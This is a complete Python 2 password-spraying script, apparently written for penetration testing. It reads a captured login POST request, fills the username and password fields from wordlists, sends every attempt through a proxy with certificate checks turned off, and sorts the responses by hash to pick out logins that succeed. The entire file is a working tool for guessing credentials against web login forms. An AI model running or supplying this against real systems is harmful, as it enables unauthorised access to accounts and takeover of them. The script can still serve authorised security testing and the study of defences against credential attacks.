#!/usr/bin/python

import argparse
import requests
import os
import sys
import time
import hashlib

# Parse command line arguments

parser = argparse.ArgumentParser()

parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
parser.add_argument("--duration", default="10", help="Total spray duration. Default is 2 hours.")

args = parser.parse_args()

# Supporting variables/work
proxies = {'http' : 'http://10.10.110.100:8080'}
sleepTimeMinutes = 0.05
sleepTimeSeconds = int(round(sleepTimeMinutes*60))
if not os.path.exists("logs"):
    os.makedirs("logs")

# Ensure spray time is appropriate
if raw_input("You will be spraying every " \
        + str(sleepTimeMinutes) + " minutes. Is that cool? (y/N) ").lower() != 'y':
    sys.exit("Change spray time.")

################################################################################


# Parse request file
requestsFile = open('request.txt', 'r')
lineList = requestsFile.readlines()
endPoint = lineList[0].split(' ')[1].strip()
headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
requestsFile.close()
if("USERPR3Y" not in dataDict.values() or "PASSPR3Y" not in dataDict.values()):
    sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")

# Parse usernames file
usernamesFile = open('usernames.txt', 'r')
usernamesList = map(str.strip, usernamesFile.readlines())
usernamesFile.close()

# Parse passwords file
passwordsFile = open('passwords.txt', 'r')
passwordsList = map(str.strip, passwordsFile.readlines())
passwordsFile.close()

# Prepare injection points
usernameKey = ""
passwordKey = ""
for key,value in dataDict.iteritems():
    if value == "USERPR3Y":
        usernameKey = key
    elif value == "PASSPR3Y":
        passwordKey = key

# Spray
for password in passwordsList:

    # Get time right before spray
    date = time.strftime("%m.%d.%Y", time.gmtime())
    tyme = time.strftime("%H:%M:%S", time.gmtime())

    responseDict = {}

    # Perform spray
    for username in usernamesList:
        # Load injection points
        dataDict[usernameKey] = username
        dataDict[passwordKey] = password
        
        # Attempt login
        print "Attemping " + username + ':' + password
        url = "http://" + headerDict["Host"] + endPoint
        response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)

        # Create hash of response
        checksummer = hashlib.md5()
        checksummer.update(response.content)

        # Store hash of response. Chance of collision but very minimal.
        responseDict[checksummer.hexdigest()] = response

#    meaningFulResponses = extractMeaningfulResponses(responseDict)

    # Create file
    if not os.path.exists("logs/" + date):
        os.makedirs("logs/" + date)
    if not os.path.exists("logs/" + date + '/' + tyme):
        os.makedirs("logs/" + date + '/' + tyme)

    # Write to file. Files are named with hashes that distinguish between unique responses.
    for key,value in responseDict.iteritems():
        fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')

        # Log request. If there were redirects, log the very first request made.
        fileOut.write('-'*80 + '\n')
        fileOut.write("REQUEST")
        fileOut.write('\n' + '-'*80 + '\n')

        requestToLog = requests.Request()
        if(value.history):
            requestToLog = value.history[0].request
        else:
            requestToLog = value.request

        fileOut.write(str(requestToLog.url) + '\n\n')
        for k2,v2 in requestToLog.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + str(requestToLog.body) + '\n')

        fileOut.write('\n' + '-'*80 + '\n')
        fileOut.write("RESPONSE")
        fileOut.write('\n' + '-'*80 + '\n')

        # Log response
        fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
        for k2,v2 in value.headers.iteritems():
            fileOut.write(k2 + ": " + v2 + '\n')
        fileOut.write('\n' + value.text)

        fileOut.close()

    time.sleep(sleepTimeSeconds)
